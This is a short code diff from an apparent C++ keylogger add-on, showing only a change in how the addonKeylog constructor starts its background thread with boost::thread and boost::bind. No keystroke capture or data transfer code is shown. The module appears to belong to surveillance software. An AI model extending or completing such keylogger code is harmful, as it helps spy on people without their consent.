@@ -27,7 +27,7 @@ addonKeylog::addonKeylog()
 	this->threadActive = true;
 	lock.unlock();
 
-	boost::thread keylog(&addonKeylog::Thread);
+	boost::thread keylog(boost::bind(&addonKeylog::Thread));
 }
 
 
